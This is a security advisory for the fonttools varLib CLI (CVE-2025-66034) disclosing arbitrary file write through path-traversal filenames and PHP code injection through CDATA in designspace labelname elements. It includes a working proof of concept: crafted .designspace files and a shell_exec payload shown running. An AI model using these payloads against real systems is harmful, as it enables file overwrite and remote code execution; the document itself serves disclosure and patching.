@@ -1,0 +1,184 @@
+PYSEC-2026-1389 PyPI/fonttools — fontTools is Vulnerable to Arbitrary File Write and XML injection in fontTools.varLib
+package: fonttools
+ecosystem: PyPI
+versions affected:
+  >= 4.33.0, < 4.60.2 (ECOSYSTEM)
+aliases: CVE-2025-66034, GHSA-768j-98cg-p3fv
+references:
+  https://github.com/fonttools/fonttools/security/advisories/GHSA-768j-98cg-p3fv
+  https://nvd.nist.gov/vuln/detail/CVE-2025-66034
+  https://github.com/fonttools/fonttools/commit/a696d5ba93270d5954f98e7cab5ddca8a02c1e32
+  https://github.com/fonttools/fonttools
+  https://pypi.org/project/fonttools
+  https://github.com/advisories/GHSA-768j-98cg-p3fv
+
+## Summary
+
+The `fonttools varLib` (or `python3 -m fontTools.varLib`) script has an arbitrary file write vulnerability that leads to remote code execution when a malicious .designspace file is processed. The vulnerability affects the `main()` code path of `fontTools.varLib`, used by the fonttools varLib CLI and any code that invokes `fontTools.varLib.main()`.
+
+The vulnerability exists due to unsanitised filename handling combined with content injection. Attackers can write files to arbitrary filesystem locations via path traversal sequences, and inject malicious code (like PHP) into the output files through XML injection in labelname elements. When these files are placed in web-accessible locations and executed, this achieves remote code execution without requiring any elevated privileges. Once RCE is obtained, attackers can further escalate privileges to compromise system files (like overwriting `/etc/passwd`).
+
+Overall this allows attackers to:
+- Write font files to arbitrary locations on the filesystem
+- Overwrite configuration files
+- Corrupt application files and dependencies
+- Obtain remote code execution
+
+The attacker controls the file location, extension and contents which could lead to remote code execution as well as enabling a denial of service through file corruption means.
+
+## Affected Lines
+
+`fontTools/varLib/__init__.py`
+```python
+filename = vf.filename # Unsanitised filename
+output_path = os.path.join(output_dir, filename) # Path traversal
+vf.save(output_path) # Arbitrary file write
+```
+
+## PoC
+1. Set up `malicious.designspace` and respective `source-*.ttf` files in a directory like `/Users/<username>/testing/demo/` (will impact relative file location within malicious.designspace)
+
+`setup.py`
+```python
+#!/usr/bin/env python3
+import os
+
+from fontTools.fontBuilder import FontBuilder
+from fontTools.pens.ttGlyphPen import TTGlyphPen
+
+def create_source_font(filename, weight=400):
+    fb = FontBuilder(unitsPerEm=1000, isTTF=True)
+    fb.setupGlyphOrder([".notdef"])
+    fb.setupCharacterMap({})
+    
+    pen = TTGlyphPen(None)
+    pen.moveTo((0, 0))
+    pen.lineTo((500, 0))
+    pen.lineTo((500, 500))
+    pen.lineTo((0, 500))
+    pen.closePath()
+    
+    fb.setupGlyf({".notdef": pen.glyph()})
+    fb.setupHorizontalMetrics({".notdef": (500, 0)})
+    fb.setupHorizontalHeader(ascent=800, descent=-200)
+    fb.setupOS2(usWeightClass=weight)
+    fb.setupPost()
+    fb.setupNameTable({"familyName": "Test", "styleName": f"Weight{weight}"})
+    fb.save(filename)
+
+if __name__ == '__main__':
+    os.chdir(os.path.dirname(os.path.abspath(__file__)))
+    create_source_font("source-light.ttf", weight=100)
+    create_source_font("source-regular.ttf", weight=400)
+```
+
+`malicious.designspace`
+```xml
+<?xml version='1.0' encoding='UTF-8'?>
+<designspace format="5.0">
+  <axes>
+    <axis tag="wght" name="Weight" minimum="100" maximum="900" default="400"/>
+  </axes>
+  
+  <sources>
+    <source filename="source-light.ttf" name="Light">
+      <location>
+        <dimension name="Weight" xvalue="100"/>
+      </location>
+    </source>
+    <source filename="source-regular.ttf" name="Regular">
+      <location>
+        <dimension name="Weight" xvalue="400"/>
+      </location>
+    </source>
+  </sources>
+  
+  <!-- Filename can be arbitrarily set to any path on the filesystem -->
+  <variable-fonts>
+    <variable-font name="MaliciousFont" filename="../../tmp/newarbitraryfile.json">
+      <axis-subsets>
+        <axis-subset name="Weight"/>
+      </axis-subsets>
+    </variable-font>
+  </variable-fonts>
+</designspace>
+```
+
+Optional: You can put a file with any material within `../../tmp/newarbitraryfile.json` in advance, the contents in the file will be overwritten after running the setup script in the following step.
+
+2. Run the setup.py script to generate `source-*.tff` files required for the malicious.designspace file.
+```bash
+python3 setup.py
+```
+3. Execute the given payload using the vulnerable varLib saving the file into the arbitrary file location of filename
+```bash
+fonttools varLib malicious.designspace
+```
+4. Validate arbitrary file write was performed by looking at path assigned within malicious designspace
+```bash
+cat {{filename_location}}
+```
+5. After validating that we can provide arbitrary write to any location, we can also validate that we can control sections of content as well demonstrated with the below payload.
+
+`malicious2.designspace`
+```xml
+<?xml version='1.0' encoding='UTF-8'?>
+<designspace format="5.0">
+	<axes>
+        <!-- XML injection occurs in labelname elements with CDATA sections -->
+	    <axis tag="wght" name="Weight" minimum="100" maximum="900" default="400">
+	        <labelname xml:lang="en"><![CDATA[<?php echo shell_exec("/usr/bin/touch /tmp/MEOW123");?>]]]]><![CDATA[>]]></labelname>
+	        <labelname xml:lang="fr">MEOW2</labelname>
+	    </axis>
+	</axes>
+	<axis tag="wght" name="Weight" minimum="100" maximum="900" default="400"/>
+	<sources>
+		<source filename="source-light.ttf" name="Light">
+			<location>
+				<dimension name="Weight" xvalue="100"/>
+			</location>
+		</source>
+		<source filename="source-regular.ttf" name="Regular">
+			<location>
+				<dimension name="Weight" xvalue="400"/>
+			</location>
+		</source>
+	</sources>
+	<variable-fonts>
+		<variable-font name="MyFont" filename="output.ttf">
+			<axis-subsets>
+				<axis-subset name="Weight"/>
+			</axis-subsets>
+		</variable-font>
+	</variable-fonts>
+	<instances>
+		<instance name="Display Thin" familyname="MyFont" stylename="Thin">
+			<location><dimension name="Weight" xvalue="100"/></location>
+			<labelname xml:lang="en">Display Thin</labelname>
+		</instance>
+	</instances>
+</designspace>
+```
+
+6. When the program is run, we can show we control the contents in the new file
+```bash
+fonttools varLib malicious2.designspace -o file123
+```
+Here being outputted to a localised area ignoring filename presented in variable-font
+
+7. We can look inside file123 to validate user controlled injection
+```bash
+cat file123
+```
+to show `<?php echo shell_exec("/usr/bin/touch /tmp/MEOW123");?>]]>`
+
+8. Executing the file and reading looking at the newly generated file
+```bash
+php file123
+ls -la /tmp/MEOW123
+```
+we can see that the file was just created showing RCE.
+
+## Recommendations
+
+- Ensure output file paths configured within designspace files are restricted to the local directory or consider further security measures to prevent arbitrary file write/overwrite within any directory on the system
